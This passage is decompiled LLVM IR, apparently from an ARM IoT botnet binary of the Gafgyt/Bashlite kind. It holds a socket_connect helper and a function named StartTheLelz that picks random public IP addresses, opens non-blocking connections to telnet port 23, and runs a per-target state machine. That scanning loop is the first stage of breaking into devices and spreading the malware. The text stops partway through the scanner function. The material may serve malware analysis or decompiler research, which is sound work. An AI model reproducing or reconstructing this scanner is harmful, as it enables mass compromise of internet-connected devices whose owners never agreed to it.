  uselistorder label %dec_label_pc_dd2c, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_dd40 = load i32, i32* @fp, align 4
  store i32 56648, i32* %stack_var_-4, align 4
  %v2_dd44 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dd44, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_dd6c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_dd7c = icmp eq i32 %v1_dd6c, 0
  br i1 %v2_dd7c, label %dec_label_pc_dd84, label %dec_label_pc_dd90

dec_label_pc_dd84:                                ; preds = %entry
  br label %dec_label_pc_de78

dec_label_pc_dd90:                                ; preds = %entry
  %tmp = sext i8 %arg2 to i32
  %v1_dd94 = add i32 %v1_dd6c, 16
  %v2_dd94 = inttoptr i32 %v1_dd94 to i32*
  %v3_dd94 = load i32, i32* %v2_dd94, align 4
  %v1_dd98 = inttoptr i32 %v3_dd94 to i32*
  %v2_dd98 = load i32, i32* %v1_dd98, align 4
  %v1_dda0 = add i32 %v1_dd6c, 12
  %v2_dda0 = inttoptr i32 %v1_dda0 to i32*
  %v3_dda0 = load i32, i32* %v2_dda0, align 4
  store i32 %v3_dda0, i32* @r2, align 4
  %v2_ddac = ptrtoint i32* %stack_var_-36 to i32
  %v3_ddb8 = call i32 @bcopy(i32 %v2_dd98, i32 %v2_ddac, i32 %v3_dda0)
  %v1_ddd0 = call i32 @htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v0_de00 = call i32 @socket()
  %v6_de28 = call i32 @__GI_setsockopt(i32 %v0_de00, i32 6, i32 1, i32* nonnull %stack_var_-44, i32 4)
  %v3_de30 = icmp eq i32 %v0_de00, -1
  br i1 %v3_de30, label %dec_label_pc_de38, label %dec_label_pc_de44

dec_label_pc_de38:                                ; preds = %dec_label_pc_dd90
  br label %dec_label_pc_de78

dec_label_pc_de44:                                ; preds = %dec_label_pc_dd90
  %v3_de54 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_de54 = call i32 @__libc_connect(i32 %v0_de00, %sockaddr* %v3_de54, i32 16)
  %v3_de5c = icmp eq i32 %v4_de54, -1
  br i1 %v3_de5c, label %dec_label_pc_de64, label %dec_label_pc_de70

dec_label_pc_de64:                                ; preds = %dec_label_pc_de44
  br label %dec_label_pc_de78

dec_label_pc_de70:                                ; preds = %dec_label_pc_de44
  br label %dec_label_pc_de78

dec_label_pc_de78:                                ; preds = %dec_label_pc_de64, %dec_label_pc_de38, %dec_label_pc_dd84, %dec_label_pc_de70
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_dd84 ], [ 0, %dec_label_pc_de38 ], [ 0, %dec_label_pc_de64 ], [ %v0_de00, %dec_label_pc_de70 ]
  store i32 %v3_dd40, i32* @fp, align 4
  ret i32 %stack_var_-56.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_de78, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_de88 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_de88, i32* %ip.global-to-local, align 4
  %v3_de8c = load i32, i32* @r4, align 4
  store i32 %v3_de8c, i32* %stack_var_-24, align 4
  store i32 56980, i32* %stack_var_-4, align 4
  %v19_de8c = ptrtoint i32* %stack_var_-24 to i32
  %v2_de90 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_de90, i32* @fp, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_deac = call i32 @__GI_time(i32* null)
  store i32 %v2_deac, i32* %r3.global-to-local, align 4
  store i32 %v2_deac, i32* @r4, align 4
  %v0_deb8 = call i32 @rand_cmwc()
  %v0_dec0 = load i32, i32* @r4, align 4
  %v2_dec0 = xor i32 %v0_dec0, %v0_deb8
  store i32 %v2_dec0, i32* %r3.global-to-local, align 4
  %v1_dec8 = call i32 @srand(i32 %v2_dec0)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_dee0 = call i32 @htons(i32 23)
  %v2_def8 = ptrtoint i32* %stack_var_-604 to i32
  store i32 %v2_def8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-604, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_df14 = call i32 @malloc(i32 513)
  store i32 513, i32* %r3.global-to-local, align 4
  store i32 513, i32* @r2, align 4
  %v2_df3c = inttoptr i32 %v1_df14 to i8*
  %v3_df3c = call i32 @__GI_memset(i8* %v2_df3c, i32 0)
  %v2_df4c = mul i32 %arg2, 28
  %v1_df50 = or i32 %v2_df4c, 3
  %v1_df54 = add i32 %v1_df50, 3
  %v3_df58 = and i32 %v1_df54, -4
  %v1_df60 = load i32, i32* @sp, align 4
  %v2_df60 = sub i32 %v1_df60, %v3_df58
  %v1_df70 = add i32 %v2_df60, 7
  %v3_df74 = and i32 %v1_df70, -4
  %v2_df98 = mul i32 %arg2, 5
  store i32 %v2_df98, i32* %r3.global-to-local, align 4
  store i32 %v2_df98, i32* @r2, align 4
  %v2_dfac = inttoptr i32 %v3_df74 to i8*
  %v3_dfac = call i32 @__GI_memset(i8* %v2_dfac, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_e08c61 = icmp sgt i32 %arg2, 0
  br i1 %v5_e08c61, label %dec_label_pc_dfbc, label %dec_label_pc_e090

dec_label_pc_dfbc:                                ; preds = %entry, %dec_label_pc_dfbc
  %storemerge462 = phi i32 [ %v1_e078, %dec_label_pc_dfbc ], [ 0, %entry ]
  %v2_dfcc = mul i32 %storemerge462, 28
  %v2_dfd0 = add i32 %v2_dfcc, %v3_df74
  store i32 %v2_dfd0, i32* %r3.global-to-local, align 4
  %v2_dfd8 = inttoptr i32 %v2_dfd0 to i32*
  store i32 0, i32* %v2_dfd8, align 4
  %v0_dfdc = load i32, i32* %r3.global-to-local, align 4
  %v1_dfdc = add i32 %v0_dfdc, 4
  store i32 %v1_dfdc, i32* %r3.global-to-local, align 4
  %v2_dfe4 = inttoptr i32 %v1_dfdc to i32*
  store i32 0, i32* %v2_dfe4, align 4
  %v0_dfe8 = load i32, i32* %r3.global-to-local, align 4
  %v1_dfe8 = add i32 %v0_dfe8, 4
  store i32 %v1_dfe8, i32* %r3.global-to-local, align 4
  %v2_dff0 = inttoptr i32 %v1_dfe8 to i32*
  store i32 0, i32* %v2_dff0, align 4
  %v0_dff4 = load i32, i32* %r3.global-to-local, align 4
  %v1_dff4 = add i32 %v0_dff4, 4
  store i32 %v1_dff4, i32* %r3.global-to-local, align 4
  %v2_dffc = inttoptr i32 %v1_dff4 to i32*
  store i32 0, i32* %v2_dffc, align 4
  %v0_e000 = load i32, i32* %r3.global-to-local, align 4
  %v1_e000 = add i32 %v0_e000, 4
  store i32 %v1_e000, i32* %r3.global-to-local, align 4
  %v2_e008 = inttoptr i32 %v1_e000 to i32*
  store i32 0, i32* %v2_e008, align 4
  %v0_e00c = load i32, i32* %r3.global-to-local, align 4
  %v1_e00c = add i32 %v0_e00c, 4
  store i32 %v1_e00c, i32* %r3.global-to-local, align 4
  %v2_e014 = inttoptr i32 %v1_e00c to i32*
  store i32 0, i32* %v2_e014, align 4
  %v0_e018 = load i32, i32* %r3.global-to-local, align 4
  %v1_e018 = add i32 %v0_e018, 4
  %v2_e020 = inttoptr i32 %v1_e018 to i32*
  store i32 0, i32* %v2_e020, align 4
  %v3_e048 = add i32 %v2_dfd0, 9
  %v4_e048 = inttoptr i32 %v3_e048 to i8*
  store i8 1, i8* %v4_e048, align 1
  %v2_e068 = add i32 %v2_dfd0, 24
  %v2_e070 = inttoptr i32 %v2_e068 to i32*
  store i32 %v1_df14, i32* %v2_e070, align 4
  %v1_e078 = add nuw nsw i32 %storemerge462, 1
  store i32 %v1_e078, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_e08c = icmp slt i32 %v1_e078, %arg2
  br i1 %v5_e08c, label %dec_label_pc_dfbc, label %dec_label_pc_e090

dec_label_pc_e090:                                ; preds = %dec_label_pc_dfbc, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e098

dec_label_pc_e098:                                ; preds = %dec_label_pc_e098, %dec_label_pc_e090
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_e090 ], [ %v1_e09c, %dec_label_pc_e098 ]
  %v1_e09c = add i32 %stack_var_-56.0, 1
  store i32 %v1_e09c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([10 x i8*]* @global_var_261a8.489 to i32), i32* %r3.global-to-local, align 4
  %v4_e0ac = mul i32 %v1_e09c, 4
  %v5_e0ac = add i32 %v4_e0ac, ptrtoint ([10 x i8*]* @global_var_261a8.489 to i32)
  %v6_e0ac = inttoptr i32 %v5_e0ac to i32*
  %v7_e0ac = load i32, i32* %v6_e0ac, align 4
  store i32 %v7_e0ac, i32* %r3.global-to-local, align 4
  %v2_e0b0 = icmp eq i32 %v7_e0ac, 0
  br i1 %v2_e0b0, label %dec_label_pc_e0b8.preheader, label %dec_label_pc_e098

dec_label_pc_e0b8.preheader:                      ; preds = %dec_label_pc_e098
  %v2_e140 = add i32 %v3_df74, 8
  %v2_e474 = add i32 %v3_df74, 4
  %v3_e564 = bitcast i32* %stack_var_-612 to %sockaddr*
  %v2_e5d4 = ptrtoint i32* %stack_var_-324 to i32
  %v2_e6d0 = ptrtoint i32* %stack_var_-332 to i32
  %v2_e72c = ptrtoint i32* %stack_var_-340 to i32
  %v2_e730 = ptrtoint i32* %stack_var_-336 to i32
  %v2_e84c = add i32 %v3_df74, 16
  %v2_e8c8 = add i32 %v3_df74, 24
  br label %dec_label_pc_e0b8

dec_label_pc_e0b8:                                ; preds = %dec_label_pc_e0b8, %dec_label_pc_f248, %dec_label_pc_e0b8.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v5_e08c61, label %dec_label_pc_e0c4, label %dec_label_pc_e0b8

dec_label_pc_e0c4:                                ; preds = %dec_label_pc_e0b8, %dec_label_pc_f248
  %storemerge553 = phi i32 [ %v1_f24c, %dec_label_pc_f248 ], [ 0, %dec_label_pc_e0b8 ]
  %v3_e0d0 = mul i32 %storemerge553, 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  %v2_e0d8 = mul i32 %storemerge553, 28
  %v2_e0dc = add i32 %v2_e0d8, %v3_df74
  %v2_e0e0 = add i32 %v2_e0dc, 16
  store i32 %v2_e0e0, i32* %r3.global-to-local, align 4
  %v1_e0e4 = inttoptr i32 %v2_e0e0 to i32*
  %v2_e0e4 = load i32, i32* %v1_e0e4, align 4
  store i32 %v2_e0e4, i32* %r3.global-to-local, align 4
  %v2_e0e8 = icmp eq i32 %v2_e0e4, 0
  br i1 %v2_e0e8, label %dec_label_pc_e0f0, label %dec_label_pc_e128

dec_label_pc_e0f0:                                ; preds = %dec_label_pc_e0c4
  store i32 %storemerge553, i32* @r4, align 4
  %v2_e0f8 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_e10c = load i32, i32* @r4, align 4
  %v3_e110 = mul i32 %v0_e10c, 4
  store i32 %v3_e110, i32* %r2.global-to-local, align 4
  %v2_e118 = mul i32 %v0_e10c, 28
  %v2_e120 = add i32 %v2_e84c, %v2_e118
  store i32 %v2_e120, i32* %r3.global-to-local, align 4
  %v2_e124 = inttoptr i32 %v2_e120 to i32*
  store i32 %v2_e0f8, i32* %v2_e124, align 4
  br label %dec_label_pc_e128

dec_label_pc_e128:                                ; preds = %dec_label_pc_e0c4, %dec_label_pc_e0f0
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  %v2_e144 = add i32 %v2_e140, %v2_e0d8
  store i32 %v2_e144, i32* %r3.global-to-local, align 4
  %v1_e148 = inttoptr i32 %v2_e144 to i8*
  %v2_e148 = load i8, i8* %v1_e148, align 4
  %v3_e148 = sext i8 %v2_e148 to i32
  %v4_e148 = zext i8 %v2_e148 to i32
  store i32 %v4_e148, i32* %r3.global-to-local, align 4
  switch i32 %v3_e148, label %dec_label_pc_f248 [
    i32 0, label %dec_label_pc_e178
    i32 1, label %dec_label_pc_e5e8.lr.ph
    i32 2, label %dec_label_pc_e894
    i32 3, label %dec_label_pc_e9e0
    i32 4, label %dec_label_pc_eb34
    i32 5, label %dec_label_pc_ec80
    i32 6, label %dec_label_pc_edd4
    i32 7, label %dec_label_pc_f0d8
  ]

dec_label_pc_e178:                                ; preds = %dec_label_pc_e128
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  %v2_e194 = add i32 %v2_e0dc, 8
  store i32 %v2_e194, i32* %r3.global-to-local, align 4
  %v1_e198 = add i32 %v2_e0dc, 9
  %v2_e198 = inttoptr i32 %v1_e198 to i8*
  %v3_e198 = load i8, i8* %v2_e198, align 1
  %v7_e19c = icmp eq i8 %v3_e198, 1
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v7_e19c, label %dec_label_pc_e1a4, label %dec_label_pc_e290

dec_label_pc_e1a4:                                ; preds = %dec_label_pc_e178
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  %v2_e1c0 = add i32 %v2_e0dc, 24
  store i32 %v2_e1c0, i32* %r3.global-to-local, align 4
  %v1_e1c4 = inttoptr i32 %v2_e1c0 to i32*
  %v2_e1c4 = load i32, i32* %v1_e1c4, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v2_e1e8 = inttoptr i32 %v2_e0dc to i32*
  store i32 0, i32* %v2_e1e8, align 4
  %v0_e1ec = load i32, i32* %r3.global-to-local, align 4
  %v1_e1ec = add i32 %v0_e1ec, 4
  store i32 %v1_e1ec, i32* %r3.global-to-local, align 4
  %v2_e1f4 = inttoptr i32 %v1_e1ec to i32*
  store i32 0, i32* %v2_e1f4, align 4
  %v0_e1f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e1f8 = add i32 %v0_e1f8, 4
  store i32 %v1_e1f8, i32* %r3.global-to-local, align 4
  %v2_e200 = inttoptr i32 %v1_e1f8 to i32*
  store i32 0, i32* %v2_e200, align 4
  %v0_e204 = load i32, i32* %r3.global-to-local, align 4
  %v1_e204 = add i32 %v0_e204, 4
  store i32 %v1_e204, i32* %r3.global-to-local, align 4
  %v2_e20c = inttoptr i32 %v1_e204 to i32*
  store i32 0, i32* %v2_e20c, align 4
  %v0_e210 = load i32, i32* %r3.global-to-local, align 4
  %v1_e210 = add i32 %v0_e210, 4
  store i32 %v1_e210, i32* %r3.global-to-local, align 4
  %v2_e218 = inttoptr i32 %v1_e210 to i32*
  store i32 0, i32* %v2_e218, align 4
  %v0_e21c = load i32, i32* %r3.global-to-local, align 4
  %v1_e21c = add i32 %v0_e21c, 4
  store i32 %v1_e21c, i32* %r3.global-to-local, align 4
  %v2_e224 = inttoptr i32 %v1_e21c to i32*
  store i32 0, i32* %v2_e224, align 4
  %v0_e228 = load i32, i32* %r3.global-to-local, align 4
  %v1_e228 = add i32 %v0_e228, 4
  %v2_e230 = inttoptr i32 %v1_e228 to i32*
  store i32 0, i32* %v2_e230, align 4
  store i32 %v2_e1c0, i32* %r2.global-to-local, align 4
  store i32 %v2_e1c4, i32* %r3.global-to-local, align 4
  store i32 %v2_e1c4, i32* %v1_e1c4, align 4
  store i32 %storemerge553, i32* @r4, align 4
  %v5_e260 = call i32 @GetRandomPublicIP(i32 24, i32 %v3_df74, i32 %v2_e1c0, i32 %v2_e1c4, i32 %v2_e1c4)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_e270 = load i32, i32* @r4, align 4
  %v3_e274 = mul i32 %v0_e270, 4
  store i32 %v3_e274, i32* %r2.global-to-local, align 4
  %v2_e27c = mul i32 %v0_e270, 28
  %v2_e284 = add i32 %v2_e474, %v2_e27c
  store i32 %v2_e284, i32* %r3.global-to-local, align 4
  %v2_e288 = inttoptr i32 %v2_e284 to i32*
  store i32 %v5_e260, i32* %v2_e288, align 4
  br label %dec_label_pc_e41c

dec_label_pc_e290:                                ; preds = %dec_label_pc_e178
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e194, i32* %r3.global-to-local, align 4
  %v3_e2b0 = load i8, i8* %v2_e198, align 1
  %v4_e2b0 = zext i8 %v3_e2b0 to i32
  store i32 %v4_e2b0, i32* %r3.global-to-local, align 4
  %v2_e2b4 = icmp eq i8 %v3_e2b0, 0
  br i1 %v2_e2b4, label %dec_label_pc_e2bc, label %dec_label_pc_e41c

dec_label_pc_e2bc:                                ; preds = %dec_label_pc_e290
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e194, i32* %r3.global-to-local, align 4
  %v1_e2e0 = add i32 %v2_e0dc, 11
  %v2_e2e0 = inttoptr i32 %v1_e2e0 to i8*
  %v3_e2e0 = load i8, i8* %v2_e2e0, align 1
  %v1_e2e4 = add i8 %v3_e2e0, 1
  store i8 %v1_e2e4, i8* %v2_e2e0, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e194, i32* %r3.global-to-local, align 4
  %v1_e338 = add i32 %v2_e0dc, 10
  %v2_e338 = inttoptr i32 %v1_e338 to i8*
  %v3_e338 = load i8, i8* %v2_e338, align 2
  %v1_e33c = add i8 %v3_e338, 1
  store i32 %v3_df74, i32* %ip.global-to-local, align 4
  store i8 %v1_e33c, i8* %v2_e338, align 2
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e194, i32* %r3.global-to-local, align 4
  %v3_e38c = load i8, i8* %v2_e2e0, align 1
  %v7_e390 = icmp eq i8 %v3_e38c, 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  br i1 %v7_e390, label %dec_label_pc_e398, label %dec_label_pc_e3c4

dec_label_pc_e398:                                ; preds = %dec_label_pc_e2bc
  store i32 %v2_e194, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_e198, align 1
  br label %dec_label_pc_f248

dec_label_pc_e3c4:                                ; preds = %dec_label_pc_e2bc
  store i32 %v2_e194, i32* %r3.global-to-local, align 4
  %v3_e3e4 = load i8, i8* %v2_e338, align 2
  %v4_e3e4 = zext i8 %v3_e3e4 to i32
  store i32 %v4_e3e4, i32* %r3.global-to-local, align 4
  %v7_e3e8 = icmp eq i8 %v3_e3e4, 4
  br i1 %v7_e3e8, label %dec_label_pc_e3f0, label %dec_label_pc_e41c

dec_label_pc_e3f0:                                ; preds = %dec_label_pc_e3c4
  store i32 %v2_e194, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_e198, align 1
  br label %dec_label_pc_f248

dec_label_pc_e41c:                                ; preds = %dec_label_pc_e3c4, %dec_label_pc_e290, %dec_label_pc_e1a4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_e430 = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-604, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  %v2_e478 = add i32 %v2_e474, %v2_e0d8
  store i32 %v2_e478, i32* %r3.global-to-local, align 4
  %v1_e47c = inttoptr i32 %v2_e478 to i32*
  %v2_e47c = load i32, i32* %v1_e47c, align 4
  store i32 %v2_e47c, i32* %r3.global-to-local, align 4
  store i32 %storemerge553, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_e494 = call i32 @socket()
  %v0_e49c = load i32, i32* @r4, align 4
  %v2_e4a8 = mul i32 %v0_e49c, 28
  %v2_e4ac = add i32 %v2_e4a8, %v3_df74
  %v2_e4b0 = inttoptr i32 %v2_e4ac to i32*
  store i32 %v0_e494, i32* %v2_e4b0, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v1_e4cc = inttoptr i32 %v2_e0dc to i32*
  %v2_e4cc = load i32, i32* %v1_e4cc, align 4
  store i32 %v2_e4cc, i32* %r3.global-to-local, align 4
  %v7_e4d0 = icmp eq i32 %v2_e4cc, -1
  br i1 %v7_e4d0, label %dec_label_pc_f248, label %dec_label_pc_e4d8

dec_label_pc_e4d8:                                ; preds = %dec_label_pc_e41c
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v2_e4f0 = load i32, i32* %v1_e4cc, align 4
  store i32 %v2_e4f0, i32* @r4, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v2_e50c = load i32, i32* %v1_e4cc, align 4
  store i32 %v2_e50c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_e51c = call i32 @__libc_fcntl(i32 %v2_e50c, i32 3)
  %v1_e524 = or i32 %v2_e51c, 2048
  store i32 %v1_e524, i32* %r3.global-to-local, align 4
  %v0_e528 = load i32, i32* @r4, align 4
  store i32 %v1_e524, i32* @r2, align 4
  %v2_e534 = call i32 @__libc_fcntl(i32 %v0_e528, i32 4)
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v2_e550 = load i32, i32* %v1_e4cc, align 4
  store i32 %v2_e550, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_e564 = call i32 @__libc_connect(i32 %v2_e550, %sockaddr* nonnull %v3_e564, i32 16)
  store i32 %v4_e564, i32* %r3.global-to-local, align 4
  %v3_e56c = icmp eq i32 %v4_e564, -1
  br i1 %v3_e56c, label %dec_label_pc_e574, label %dec_label_pc_e5ac

dec_label_pc_e574:                                ; preds = %dec_label_pc_e4d8
  %v0_e574 = call i32 @__errno_location()
  store i32 %v0_e574, i32* %r3.global-to-local, align 4
  %v1_e57c = inttoptr i32 %v0_e574 to i32*
  %v2_e57c = load i32, i32* %v1_e57c, align 4
  store i32 %v2_e57c, i32* %r3.global-to-local, align 4
  %v7_e580 = icmp eq i32 %v2_e57c, 115
  br i1 %v7_e580, label %dec_label_pc_e5ac, label %dec_label_pc_e588

dec_label_pc_e588:                                ; preds = %dec_label_pc_e574
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v3_e5a4 = call i32 @reset_telstate(i32 %v2_e0dc, i32 %v3_df74, i32 %v3_e0d0)
  br label %dec_label_pc_f248

dec_label_pc_e5ac:                                ; preds = %dec_label_pc_e4d8, %dec_label_pc_e574
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v3_e5cc = call i32 @advance_state(i32* nonnull %v1_e4cc, i32 1)
  br label %dec_label_pc_f248

dec_label_pc_e5e8.lr.ph:                          ; preds = %dec_label_pc_e128
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e5e8

dec_label_pc_e5e8:                                ; preds = %dec_label_pc_e5e8.lr.ph, %dec_label_pc_e5e8
  %storemerge610 = phi i32 [ 0, %dec_label_pc_e5e8.lr.ph ], [ %v1_e5fc, %dec_label_pc_e5e8 ]
  store i32 %v2_e5d4, i32* %r2.global-to-local, align 4
  %v5_e5f4 = mul nuw nsw i32 %storemerge610, 4
  %v6_e5f4 = add i32 %v5_e5f4, %v2_e5d4
  %v7_e5f4 = inttoptr i32 %v6_e5f4 to i32*
  store i32 0, i32* %v7_e5f4, align 4
  %v1_e5fc = add nuw nsw i32 %storemerge610, 1
  store i32 %v1_e5fc, i32* %r3.global-to-local, align 4
  %tmp43 = icmp ult i32 %v1_e5fc, 32
  br i1 %tmp43, label %dec_label_pc_e5e8, label %dec_label_pc_e610

dec_label_pc_e610:                                ; preds = %dec_label_pc_e5e8
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v1_e628 = inttoptr i32 %v2_e0dc to i32*
  %v2_e628 = load i32, i32* %v1_e628, align 4
  %v3_e62c = udiv i32 %v2_e628, 32
  %v3_e640 = mul nuw nsw i32 %v3_e62c, 4
  %v2_e648 = add i32 %v3_e640, %v19_de8c
  store i32 %v2_e648, i32* %r2.global-to-local, align 4
  %v2_e64c = add i32 %v2_e648, -300
  store i32 %v2_e64c, i32* %r3.global-to-local, align 4
  %v1_e650 = inttoptr i32 %v2_e64c to i32*
  %v2_e650 = load i32, i32* %v1_e650, align 4
  store i32 %v2_e650, i32* %ip.global-to-local, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v2_e66c = load i32, i32* %v1_e628, align 4
  %v1_e670 = urem i32 %v2_e66c, 32
  %v6_e678 = shl i32 1, %v1_e670
  %v2_e67c = or i32 %v6_e678, %v2_e650
  store i32 %v2_e67c, i32* %v1_e650, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v2_e6c4 = load i32, i32* %v1_e628, align 4
  %v1_e6c8 = add i32 %v2_e6c4, 1
  store i32 %v1_e6c8, i32* %r2.global-to-local, align 4
  store i32 %v2_e5d4, i32* %ip.global-to-local, align 4
  %v1_e6d4 = load i32, i32* @sp, align 4
  %v2_e6d4 = inttoptr i32 %v1_e6d4 to i32*
  store i32 %v2_e6d0, i32* %v2_e6d4, align 4
  %v0_e6d8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_e5d4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_e6e8 = load i32, i32* %stack_var_-332, align 4
  %v5_e6e8 = call i32 @__libc_select(i32 %v0_e6d8, i32 0, i32 %v2_e5d4, i32 0, i32 %v4_e6e8)
  store i32 %v5_e6e8, i32* %r3.global-to-local, align 4
  %v7_e6f8 = icmp eq i32 %v5_e6e8, 1
  br i1 %v7_e6f8, label %dec_label_pc_e700, label %dec_label_pc_e804

dec_label_pc_e700:                                ; preds = %dec_label_pc_e610
  store i32 4, i32* %stack_var_-336, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v2_e728 = load i32, i32* %v1_e628, align 4
  store i32 %v2_e728, i32* %r2.global-to-local, align 4
  store i32 %v2_e72c, i32* %ip.global-to-local, align 4
  %v1_e734 = load i32, i32* @sp, align 4
  %v2_e734 = inttoptr i32 %v1_e734 to i32*
  store i32 %v2_e730, i32* %v2_e734, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 %v2_e72c, i32* %r3.global-to-local, align 4
  %v0_e748 = call i32 @getsockopt()
  %v3_e74c = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_e74c, i32* %r3.global-to-local, align 4
  %v2_e750 = icmp eq i32 %v3_e74c, 0
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  br i1 %v2_e750, label %dec_label_pc_e77c, label %dec_label_pc_e758

dec_label_pc_e758:                                ; preds = %dec_label_pc_e700
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v3_e774 = call i32 @reset_telstate(i32 %v2_e0dc, i32 %v3_df74, i32 %v3_e0d0)
  br label %dec_label_pc_f248

dec_label_pc_e77c:                                ; preds = %dec_label_pc_e700
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v2_e794 = load i32, i32* %v1_e628, align 4
  store i32 %v2_e794, i32* @r4, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v2_e7b0 = load i32, i32* %v1_e628, align 4
  store i32 %v2_e7b0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_e7c0 = call i32 @__libc_fcntl(i32 %v2_e7b0, i32 3)
  %v1_e7c8 = and i32 %v2_e7c0, -2049
  store i32 %v1_e7c8, i32* %r3.global-to-local, align 4
  %v0_e7cc = load i32, i32* @r4, align 4
  store i32 %v1_e7c8, i32* @r2, align 4
  %v2_e7d8 = call i32 @__libc_fcntl(i32 %v0_e7cc, i32 4)
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v3_e7fc = call i32 @advance_state(i32* nonnull %v1_e628, i32 2)
